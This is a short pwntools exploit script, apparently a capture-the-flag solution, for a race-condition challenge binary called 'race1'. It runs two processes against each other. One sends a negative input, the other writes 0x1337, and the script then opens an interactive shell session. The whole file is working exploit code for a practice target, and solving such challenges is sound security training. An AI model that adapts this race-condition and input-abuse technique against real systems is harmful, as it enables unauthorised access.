from pwn import *

e = ELF('./race1')

p1, p2 = e.process(), e.process()

p1.sendlineafter(b'4. check hack', b'3')
p1.sendline(b'-1')

p2.sendlineafter(b'4. check hack', b'1')
p2.sendline(str(0x1337).encode())

p1.sendlineafter(b"let's check? (y/n)", b'y')

p2.close()

p1.sendlineafter(b'4. check hack', b'4')
p1.interactive()
